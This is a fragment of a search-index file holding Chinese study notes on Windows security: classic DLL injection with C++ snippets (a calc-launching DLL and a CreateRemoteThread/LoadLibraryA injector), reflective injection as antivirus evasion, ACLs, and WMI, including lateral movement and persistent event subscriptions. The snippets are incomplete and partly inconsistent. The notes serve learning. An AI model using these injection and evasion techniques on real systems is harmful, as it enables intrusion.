\u53cd\u5c04\u578bDLL\u6ce8\u5165\u662f\u514d\u6740\u4e2d\u7684\u4e00\u4e2a\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\u3002 \u53cd\u5c04\u578bDLL\u6ce8\u5165\u4e0d\u9700\u8981DLL\u843d\u5730\uff0c\u66f4\u52a0\u9690\u853d\uff0c\u6240\u4ee5\u5c31\u51cf\u5c11\u4e86\u67e5\u6740\u7684\u98ce\u9669,\u3002","title":"DLL\u6ce8\u5165\u6280\u672f"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/#dll","text":"","title":"DLL\u6ce8\u5165\u6280\u672f"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/#_1","text":"DLL\u6ce8\u5165 \u7ecf\u5178DLL\u6ce8\u5165 \u53cd\u5c04\u578bDLL\u6ce8\u5165","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/#dll_1","text":"DLL\u6ce8\u5165\uff0c\u5c31\u662f\u4f7f\u67d0\u4e2a\u8fdb\u7a0b\u5f3a\u884c\u8fd0\u884c\u67d0\u4e00\u4e2aDLL\u6587\u4ef6\u3002","title":"DLL\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/#dll_2","text":"\u5728\u6700\u7ecf\u5178\u7684DLL\u6ce8\u5165\u4e2d\uff0c\u4f1a\u5148\u901a\u8fc7OpenProcess\u51fd\u6570\u6253\u5f00\u76ee\u6807\u8fdb\u7a0b\uff0c\u7136\u540eVirtualAllocEx\u5411\u6307\u5b9a\u8fdb\u7a0b\u5206\u914d\u5185\u5b58\u7a7a\u95f4\uff0c\u968f\u540eWriteProcessMemory\u5411\u8fdb\u7a0b\u7684\u5185\u5b58\u7a7a\u95f4\u4e2d\u5199\u5165DLL\u6587\u4ef6\u5185\u5bb9\uff0c\u7136\u540eCreateRemoteThread\u4f7f\u8fdc\u7a0b\u8fdb\u7a0b\u8c03\u7528DLL\u6587\u4ef6\u3002 \u6211\u4eec\u4ee5\u5f39\u51fa\u8ba1\u7b97\u5668\u4e3a\u76ee\u7684\uff0c\u6765\u63a2\u7a76\u5982\u4f55\u901a\u8fc7C++\u5b9e\u73b0dll\u6ce8\u5165\u3002 #include \"pch.h\" #include<stdlib.h> BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH||DLL_THREAD_ATTACH: system(\"calc\"); } return TRUE; } \u6240\u4ee5\u6211\u4eec\u7684DLL\u5c31\u662f\u5728\u88ab\u52a0\u8f7d\u7684\u65f6\u5019\u5f39\u4e00\u4e2a\u8ba1\u7b97\u5668 \u7136\u540e\u7f16\u8f91\u6211\u4eec\u7684\u6ce8\u5165\u5668,\u6ce8\u610f\uff0c\u4e0b\u9762\u7684\u64cd\u4f5c\u90fd\u662f\u7528ASCII\u5b57\u7b26\u5b8c\u6210\u7684\u800c\u4e0d\u662f\u5bbd\u5b57\u7b26\u3002 \u6253\u5f00\u6307\u5b9a\u7684\u8fdb\u7a0b\uff0c\u83b7\u53d6\u53e5\u67c4 ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1])); \u5411\u8fdc\u7a0b\u8fdb\u7a0b\u5206\u914d\u5185\u5b58\uff0c\u5e76\u5411\u5176\u5199\u5165\u6211\u4eec\u7684DLL\u6587\u4ef6\u8def\u5f84 ```\\ LPVOID remotebuffer1 = VirtualAllocEx(CurrentProcessHandle, NULL, strlen(dllpath), MEM_COMMIT, PAGE_READWRITE); write = WriteProcessMemory(CurrentProcessHandle, remotebuffer1, dllpath, strlen(dllpath), NULL); \u52a8\u6001\u83b7\u53d6LoadLibraryA \u51fd\u6570 ```\u7eaf\u6587\u672c HMODULE Ker = GetModuleHandleA(\"Kernel32.dll\"); PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(Ker, \"LoadLibraryA\"); \u901a\u8fc7CreateRemoteThread\u4e3a\u8fdc\u7a0b\u8fdb\u7a0b\u521b\u5efa\u7ebf\u7a0b\uff0c\u53bb\u8c03\u7528LoadLibrarayA \u53bb\u52a0\u8f7d\u6307\u5b9aDll CreateRemoteThread(ProcessHandle, NULL, 0, threatStartRoutineAddress, remotebuffer, 0, NULL); \u5927\u81f4\u6d41\u7a0b\u5c31\u8fd9\u6837\u3002","title":"\u7ecf\u5178DLL\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/DLL%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF/#dll_3","text":"\u53cd\u5c04\u578bDLL\u6ce8\u5165\u662f\u514d\u6740\u4e2d\u7684\u4e00\u4e2a\u6bd4\u8f83\u6709\u6548\u7684\u65b9\u6cd5\u3002 \u53cd\u5c04\u578bDLL\u6ce8\u5165\u4e0d\u9700\u8981DLL\u843d\u5730\uff0c\u66f4\u52a0\u9690\u853d\uff0c\u6240\u4ee5\u5c31\u51cf\u5c11\u4e86\u67e5\u6740\u7684\u98ce\u9669,\u3002","title":"\u53cd\u5c04\u578bDLL\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/","text":"WINDOWS\u8bbf\u95ee\u6743\u9650 \u5b89\u5168\u5bf9\u8c61\u4e0e\u5b89\u5168\u63cf\u8ff0\u7b26 ACL ACL\uff0cAccess Control List\uff0c\u5373\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff0c\u7528\u6765\u8868\u793a\u7528\u6237\uff08\u7ec4\uff09\u6743\u9650\u7684\u5217\u8868\u3002 \u5b83\u5206\u4e3aDACL\u548cSACL DACL:\u81ea\u7531\u8bbf\u95ee\u63a7\u5236\u5217\u8868 DACL\u662f\u5b89\u5168\u5bf9\u8c61\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u8bd5\u56fe\u8bbf\u95ee\u4e00\u4e2a\u5b89\u5168\u5bf9\u8c61\u65f6\uff0c\u7cfb\u7edf\u4f1a\u68c0\u67e5DACL\uff0c\u8fdb\u800c\u5224\u65ad\u8fdb\u7a0b\u662f\u5426\u80fd\u6b63\u5e38\u8bbf\u95ee\u6b64\u5bf9\u8c61\u3002 SACL:\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u5217\u8868","title":"WINDOWS\u8bbf\u95ee\u6743\u9650"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/#windows","text":"","title":"WINDOWS\u8bbf\u95ee\u6743\u9650"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/#_1","text":"","title":"\u5b89\u5168\u5bf9\u8c61\u4e0e\u5b89\u5168\u63cf\u8ff0\u7b26"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/#acl","text":"ACL\uff0cAccess Control List\uff0c\u5373\u8bbf\u95ee\u63a7\u5236\u5217\u8868\uff0c\u7528\u6765\u8868\u793a\u7528\u6237\uff08\u7ec4\uff09\u6743\u9650\u7684\u5217\u8868\u3002 \u5b83\u5206\u4e3aDACL\u548cSACL","title":"ACL"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/#dacl","text":"DACL\u662f\u5b89\u5168\u5bf9\u8c61\u7684\u4e00\u4e2a\u5c5e\u6027\uff0c\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u8bd5\u56fe\u8bbf\u95ee\u4e00\u4e2a\u5b89\u5168\u5bf9\u8c61\u65f6\uff0c\u7cfb\u7edf\u4f1a\u68c0\u67e5DACL\uff0c\u8fdb\u800c\u5224\u65ad\u8fdb\u7a0b\u662f\u5426\u80fd\u6b63\u5e38\u8bbf\u95ee\u6b64\u5bf9\u8c61\u3002","title":"DACL:\u81ea\u7531\u8bbf\u95ee\u63a7\u5236\u5217\u8868"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/WINDOWS%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90/#sacl","text":"","title":"SACL:\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u5217\u8868"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/","text":"WMI\u7c97\u7565\u5b66\u4e60 \u76ee\u5f55 WMI \u67b6\u6784 Managed Components\uff08\u7ba1\u7406\u7ec4\u4ef6\uff09 Consuming Data\uff08\u6570\u636e\u5904\u7406\uff09 Querying Data\uff08\u6570\u636e\u67e5\u8be2\uff09 Populating Data\uff08\u6570\u636e\u586b\u5145\uff09 Structuring Data\uff08\u6784\u9020\u6570\u636e\uff09 Transmitting Data\uff08\u6570\u636e\u4f20\u8f93\uff09 Performing Actions\uff08\u6267\u884c\u64cd\u4f5c\uff09 WMI\u7c7b\u548c\u547d\u540d\u7a7a\u95f4 WQL Instance Queries\uff08\u5b9e\u4f8b\u67e5\u8be2\uff09 Event Queries\uff08\u4e8b\u4ef6\u67e5\u8be2\uff09 Meta Queries\uff08\u5143\u67e5\u8be2\uff09 \u8fdc\u7a0bWMI DCOM WINRM WMI\u4e8b\u4ef6 Event FIlters \u4e8b\u4ef6\u8fc7\u6ee4\u5668 Intrinsic Events Extrinsic Events Event Consumer \u4e8b\u4ef6\u5904\u7406 WMI\uff0cWindows Management Instrumentation\uff0cWindows\u7ba1\u7406\u5de5\u5177\u3002\u5982\u4eca\u6240\u6709\u5f97windows\u90fd\u9884\u88c5\u4e86\u8fd9\u4e2a\u5f3a\u5927\u7684\u547d\u4ee4\u884c\u7ba1\u7406\u5de5\u5177\uff0c\u540c\u65f6\u5b83\u5f3a\u5927\u7684\u529f\u80fd\u4e5f\u4e3a\u9ed1\u5ba2\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7edd\u4f73\u7684\u653b\u51fb\u9762\u3002 WMI \u67b6\u6784 WMI\u7684\u67b6\u6784\u5982\u4e0b\u56fe\u6240\u793a \u53ef\u4ee5\u603b\u7ed3\u4e3a\u4ee5\u4e0b\u90e8\u5206 Managed Components\uff08\u7ba1\u7406\u7ec4\u4ef6\uff09 \u5c31\u662fWMI\u5bf9\u8c61\uff0c\u662f\u7ed3\u6784\u5316 \u7684 \u64cd\u4f5c\u7cfb\u7edf\u6570\u636e \u7684 \u7c7b\u5b9e\u4f8b\u3002 \u5fae\u8f6f\u63d0\u4f9b\u4e86\u8bb8\u591a\u7684WMI\u5bf9\u8c61\u6765\u63d0\u4f9b\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f\uff0c\u5982 Win32_Process \uff0c Win32_Service \uff0c AntiVirusProduct \uff0c Win32_StartupCommand \u7b49\u3002 Consuming Data\uff08\u6570\u636e\u5904\u7406\uff09 \u7528\u4e8e\u5904\u7406WMI\u6570\u636e\u548c\u6267\u884cWMI\u547d\u4ee4\u3002\u5982powershell\u4e0b\u7684WMI\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002 Querying Data\uff08\u6570\u636e\u67e5\u8be2\uff09 \u901a\u8fc7\u4e00\u4e2a\u53eb\u505aWQL\u7684\u8bed\u8a00\u8fdb\u884c\u67e5\u8be2\uff0c\u5b83\u548cSQL\u7684\u8bed\u6cd5\u5341\u5206\u76f8\u4f3c\u3002 Populating Data\uff08\u6570\u636e\u586b\u5145\uff09 \u5f53\u6211\u4eec\u8bf7\u6c42\u4e00\u4e2aWMI\u5bf9\u8c61\u65f6\uff0cWMI\u5728\u80cc\u540e\u4f1a\u901a\u8fc7\u5404\u79cd\u624b\u6bb5\uff08\u6bd4\u5982\u67e5\u8be2\u6240\u6709\u8fdb\u7a0b\uff0c\u679a\u4e3e\u6ce8\u518c\u8868\u952e\uff09\u53bb\u586b\u5145\u8fd9\u4e2aWMI\u5bf9\u8c61\u4ee5\u4f7f\u5176\u80fd\u591f\u5448\u73b0\u5728\u6211\u4eec\u9762\u524d\u3002 WMI\u5728\u586b\u5145\u4e00\u4e2aWMI\u5bf9\u8c61\u65f6\uff0c\u4f1a\u6709\u4e24\u79cd\u7c7b\u5b9e\u4f8b\u3002Dynamic Object\u52a8\u6001\u5bf9\u8c61\u548cPersistent Object \u6c38\u4e45\u5316\u5bf9\u8c61\u3002 \u52a8\u6001\u5bf9\u8c61\u662f\u8fdb\u884c\u67e5\u8be2\u7684\u65f6\u5019\u751f\u6210\u7684\uff0c\u4f8b\u5982Win32_Process\u5c31\u662f\u4e00\u4e2a\u52a8\u6001\u5bf9\u8c61\u3002 \u6c38\u4e45\u5316\u5bf9\u8c61\u662f\u5b58\u50a8\u5728CIM\u5e93\u4e2d\u7684\uff0c\u9ed8\u8ba4\u5b58\u653e\u5728%SystemRoot%\\System32\\wbem\\Repository\\OBJECTS.DATA Structuring Data\uff08\u6784\u9020\u6570\u636e\uff09 WMI\u5bf9\u8c61\u5927\u90e8\u5206\u7ed3\u6784\u662f\u901a\u8fc7MOF\u6587\u4ef6\u63cf\u8ff0\u7684\uff0cMOF\u6587\u4ef6\u4f7f\u7528\u7c7b\u4f3cC++\u7684\u8bed\u6cd5\u6765\u63cf\u8ff0WMI\u5bf9\u8c61\u3002 \u540c\u65f6WMI\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728CIM\u5e93\u4e2d\u63d2\u5165.net\u4ee3\u7801\u5b9a\u4e49\u3002 Transmitting Data\uff08\u6570\u636e\u4f20\u8f93\uff09 Microsoft\u63d0\u4f9b\u4e86\u4e24\u79cd\u7528\u4e8e\u8fdc\u7a0b\u4f20\u8f93WMI\u6570\u636e\u7684\u65b9\u6cd5\uff1a DCOM \u548c Windows Remote Management (WinRM) \u3002 Performing Actions\uff08\u6267\u884c\u64cd\u4f5c\uff09 \u4e00\u4e9bWMI\u5bf9\u8c61\u5305\u542b\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u65b9\u6cd5/\u51fd\u6570\u3002\u4f8b\u5982\uff0cWin32_Process\u7c7b\u7684\u9759\u6001\u51fd\u6570 Create \u5c31\u7ecf\u5e38\u88ab\u9ed1\u5ba2\u7528\u6765\u505a\u5185\u7f51\u4e2d\u7684\u6a2a\u5411\u79fb\u52a8\u3002 WMI\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a Eventing System \uff08\u4e8b\u4ef6\u7cfb\u7edf\uff09\uff0c\u7528\u6237\u53ef\u4ee5\u6ce8\u518c\u5728WMI\u5bf9\u8c61\u751f\u6210\uff0c\u4fee\u6539\u6216\u5220\u9664\u65f6\u6267\u884c\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u3002 WMI\u7c7b\u548c\u547d\u540d\u7a7a\u95f4 \u4e00\u4e2aWMI\u5bf9\u8c61\u5c31\u662f\u4e00\u4e2aWMI\u7c7b\u7684\u5b9e\u73b0\u3002 WMI\u7c7b\u88ab\u5206\u7c7b\u5206\u5c42\u653e\u5728\u547d\u540d\u7a7a\u95f4\u4e2d\uff0c\u6240\u6709\u547d\u540d\u7a7a\u95f4\u90fd\u653e\u5728ROOT\u547d\u4ee4\u7a7a\u95f4\u4e0b\uff0c\u5f53\u4e0d\u6307\u5b9a\u547d\u540d\u7a7a\u95f4\u8fdb\u884c\u67e5\u8be2\u65f6\uff0c\u4f1a\u9ed8\u8ba4\u4f7f\u7528root\\cimv2\u4f5c\u4e3a\u547d\u540d\u7a7a\u95f4\u3002 \u6240\u6709\u7684WMI\u8bbe\u7f6e\uff0c\u5305\u62ec\u9ed8\u8ba4\u547d\u540d\u7a7a\u95f4\u5728\u4e0b\u9762\u7684\u6ce8\u518c\u8868\u952e\u4e2d\uff1a HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WBEM WQL wmi\u63d0\u4f9b\u4e86\u4e00\u79cd\u975e\u5e38\u76f4\u89c2\u7684\u8bed\u6cd5\u6765\u67e5\u8be2WMI\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u7c7b\u548c\u547d\u540d\u7a7a\u95f4\uff0c\u5373WQL\u3002\u5b83\u5f88\u50cfSQL\uff0c\u4f46\u5b83\u53ea\u80fd\u7528\u4e8e\u67e5\u8be2\u3002 WQL\u67e5\u8be2\u5927\u81f4\u5206\u4e3a\u5982\u4e0b\u7c7b\uff1a Instance Queries\uff08\u5b9e\u4f8b\u67e5\u8be2\uff09 \u67e5\u8be2WMI\u5bf9\u8c61\u5b9e\u4f8b\u3002 SELECT [Class property name | *] FROM [CLASS NAME] <WHERE [CONSTRAINT]> Event Queries\uff08\u4e8b\u4ef6\u67e5\u8be2\uff09 \u7b49\u540c\u4e8e\u5728WMI\u5bf9\u8c61\u521b\u5efa/\u4fee\u6539/\u5220\u9664\u7684\u65f6\u5019\u6ce8\u518c\u4e00\u4e2a\u6d88\u606f\u3002\u5e38\u7528\u4e8e\u76d1\u542c\u67d0\u4e8b\u4ef6\u89e6\u53d1\uff0c\u6839\u636e\u76d1\u542c\u7684\u6d88\u606f\u7c7b\u578b\u662fintrinsic\uff08\u7cfb\u7edf\u81ea\u5e26\u7684\uff09\u8fd8\u662fextrinsic\uff08\u7b2c\u4e09\u65b9\u7684\uff09\uff0c\u67e5\u8be2\u8bed\u53e5\u683c\u5f0f\u4e5f\u4e0d\u540c\u3002WITHIN\u7684\u610f\u601d\u662f\u67e5\u8be2\u95f4\u9694\uff0c\u5b83\u4f1a\u6839\u636e\u8bbe\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u53bb\u67e5\u770b\u4e8b\u4ef6\u662f\u5426\u5904\u4e8e\u88ab\u89e6\u53d1\u72b6\u6001\u3002 SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] <WHERE [CONSTRAINT]> SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME] <WHERE [CONSTRAINT]> \u4e0b\u9762\u7684\u67e5\u8be2\u5c06\u5728\u7528\u6237\u767b\u5f55\u7684\u65f6\u5019\u88ab\u6267\u884c\uff1a SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA 'Win32_LogonSession' AND TargetInstance.LogonType=2 \u4e0b\u9762\u7684\u67e5\u8be2\u5c06\u5728\u7528\u6237\u63d2\u5165\u53ef\u79fb\u9664\u8bbe\u5907\u65f6\u88ab\u6267\u884c\uff1a SELECT * FROM Win32_VolumeChangeEvent Where EventType=2 Meta Queries\uff08\u5143\u67e5\u8be2\uff09 \u5143\u67e5\u8be2\u7528\u6765\u83b7\u53d6WMI\u547d\u540d\u7a7a\u95f4\u548c\u7c7b\u7ed3\u6784\u7684\u5143\u4fe1\u606f\u3002\u6700\u5e38\u89c1\u7684\u7528\u6cd5\u662f\u7528\u6765\u5217\u4e3eWMI\u547d\u540d\u7a7a\u95f4\u7684\u7c7b\u7ed3\u6784,\u5143\u67e5\u8be2\u662f\u5b9e\u4f8b\u67e5\u8be2\u7684\u4e00\u4e2a\u5b50\u96c6 SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] <WHERE [CONSTRAINT]> \u67e5\u8be2\u67d0\u9ed8\u8ba4\u547d\u540d\u7a7a\u95f4root\\cimv2\u4e0b\u7684\u6240\u6709\u547d\u540d\u7a7a\u95f4 SELECT Name FROM __NAMESPACE \u8fdc\u7a0bWMI WMI\u8fd8\u6709\u4e00\u4e2a\u5341\u5206\u5f3a\u5927\u7684\u4f53\u73b0\uff0c\u8fdc\u7a0b\u64cd\u4f5c\u3002 WMI\u8fdc\u7a0b\u64cd\u4f5c\u65f6\u652f\u6301\u4e24\u79cd\u534f\u8baeDCOM\u548cWINRM\u3002 DCOM DCOM\u662fWMI\u7684\u9ed8\u8ba4\u534f\u8bae\uff0c\u901a\u8fc7135\u7aef\u53e3\u5efa\u7acbTCP\u94fe\u63a5\uff0c\u968f\u540e\u6570\u636e\u4ea4\u6362\u5219\u662f\u968f\u673a\u9009\u62e9TCP\u7aef\u53e3\u4f20\u8f93\u3002 \u6240\u6709powershell\u4e2d\u5185\u7f6e\u7684WMI\u547d\u4ee4\u90fd\u662f\u7528\u7684DCOM\u534f\u8bae WINRM WINRM\u5728\u529f\u80fd\u6027\u4e0a\u5df2\u7ecf\u8d85\u8fc7\u4e86DCOM\uff0c\u88ab\u5fae\u8f6f\u4f5c\u4e3a\u5efa\u8bae\u4f7f\u7528\u7684\u534f\u8bae\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWinRM\u670d\u52a1\u5f00\u542f\u5e76\u76d1\u542c 5985/tcp \u7aef\u53e3\uff0c\u800c\u4e14\u9ed8\u8ba4\u662f\u52a0\u5bc6\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u8bc1\u4e66\u7684\u65b9\u5f0f\u5728 5986/tcp \u7aef\u53e3\u5b9e\u73b0 HTTPS \u652f\u6301\u3002 WMI\u4e8b\u4ef6 WMI\u4e8b\u4ef6\u53ef\u4ee5\u7528\u6765\u54cd\u5e94\u57fa\u672c\u6240\u6709\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e8b\u4ef6\u3002 WMI\u4e8b\u4ef6\u5206\u4e3a\u4e24\u7c7b\uff0c\u672c\u5730\u5355\u4e2a\u8fdb\u7a0b\u4e8b\u4ef6\u548c\u6c38\u4e45\u6027WMI\u4e8b\u4ef6\u8ba2\u9605\u3002 \u672c\u5730\u4e8b\u4ef6\u7684\u751f\u547d\u5468\u671f\u4e3a\u5bbf\u4e3b\u8fdb\u7a0b\u7684\u5468\u671f\uff0c\u6c38\u4e45\u6027WMI\u4e8b\u4ef6\u5b58\u50a8\u5728WMI\u5e93\u4e2d\u4ee5SYSTEM\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u91cd\u542f\u540e\u4f9d\u65e7\u5b58\u5728\u3002 \u5982\u679c\u8981\u5b89\u88c5\u4e00\u4e2a\u6c38\u4e45\u6027WMI\u4e8b\u4ef6\u8ba2\u9605\uff0c\u9700\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u3002 \u4e00\u4e2a\u4e8b\u4ef6\u8fc7\u6ee4\u5668 \u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\uff1a\u4ee3\u8868\u4e00\u4e2a\u4e8b\u4ef6\u89e6\u53d1\u65f6\u542f\u52a8\u7684\u52a8\u4f5c \u4e00\u4e2a\u5904\u7406\u7ed1\u5b9a\u7684\u8fc7\u6ee4\u5668\uff1a\u4ee3\u8868\u5c06\u4e00\u4e2a\u8fc7\u6ee4\u5668\u7ed1\u5b9a\u5230\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u7684\u6ce8\u518c\u673a\u5236 Event FIlters \u4e8b\u4ef6\u8fc7\u6ee4\u5668 \u4e00\u4e2a\u4e8b\u4ef6\u8fc7\u6ee4\u5668\u63a5\u6536\u4e00\u4e2aWMI\u4e8b\u4ef6\u67e5\u8be2\u53c2\u6570\uff0c\u5e76\u4fdd\u5b58\u5230 ROOT\\subscription:__EventFilter \u5bf9\u8c61\u7684\u4e00\u4e2a\u5b9e\u4f8b\u4e2d\u3002 \u4e8b\u4ef6\u8fc7\u6ee4\u5668\u4e00\u822c\u6709\u4e24\u7c7b:Intrinsic Events\u548cExtrinsic Events Intrinsic Events __NamespaceOperationEvent __NamespaceModificationEvent __NamespaceDeletionEvent __NamespaceCreationEvent __ClassOperationEvent __ClassDeletionEvent __ClassModificationEvent __ClassCreationEvent __InstanceOperationEvent __InstanceCreationEvent __MethodIvocationEvent __InstanceModificationEvent __InstanceDeletionEvent __TimerEvent \u5927\u6982\u6709\u5982\u4e0a\u4e8b\u4ef6\uff0c\u5f88\u5168\u9762\u3002 SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType=2 \u4e0a\u9762\u7684\u67e5\u8be2\u7684\u610f\u601d\u662f\uff0c\u5728\u4e00\u4e2a\u767b\u9646\u7c7b\u578b\u4e3a2\uff08\u4ea4\u4e92\u5f0f\u767b\u9646\uff09\u7684Win32_LogonSession\u7c7b\u7684\u5b9e\u4f8b\u521b\u5efa\u65f6\uff0c\u89e6\u53d1\u4e00\u4e2a\u4e8b\u4ef6\u3002 \u5b83\u6709\u4e00\u4e2a\u65f6\u95f4\u95f4\u9694\uff0c\u7528WITHIN\u8bbe\u5b9a\uff0c\u4ed6\u4f1a\u6839\u636e\u8bbe\u5b9a\u7684\u65f6\u95f4\uff0c\u6bcf\u9694\u4e00\u6bb5\u8fd9\u4e2a\u65f6\u95f4\u53bb\u68c0\u67e5\u4e00\u4e0b\u4e8b\u4ef6\u7684\u89e6\u53d1\u60c5\u51b5\u3002 \u6240\u4ee5Intrinsic events\u6709\u65f6\u5019\u5e76\u4e0d\u80fd\u6355\u6349\u5230\u4e8b\u4ef6\uff1a\u5f53\u4e8b\u4ef6\u5728\u8bbe\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u91cc\u53d1\u751f\u53c8\u6d88\u5931\u3002 Extrinsic Events Extrinsic Events \u89e3\u51b3\u4e86\u65f6\u95f4\u54cd\u5e94\u95ee\u9898\uff0c\u5f53\u4e8b\u4ef6\u53d1\u751f\u65f6\u4fbf\u4f1a\u7acb\u523b\u89e6\u53d1\u3002 \u4f46\u5b83\u7684\u4e8b\u4ef6\u7c7b\u4e0d\u591a ROOT\\CIMV2:Win32_ComputerShutdownEvent ROOT\\CIMV2:Win32_ProcessStartTrace ROOT\\CIMV2:Win32_ModuleLoadTrace ROOT\\CIMV2:Win32_ThreadStartTrace ROOT\\CIMV2:Win32_VolumnChangeEvent ROOT\\DEFAULT:Msft_WmiProvider* ROOT\\DEFAULT:RegistryKeyChangeEvent ROOT\\DEFAULT:RegistryValueChangeEvent Event Consumer \u4e8b\u4ef6\u5904\u7406 \u4e00\u4e2aEvent Consumer\u4ee3\u8868\u5f53\u4e00\u4e2a\u4e8b\u4ef6\u89e6\u53d1\u65f6\u8fdb\u884c\u7684\u64cd\u4f5c\u3002 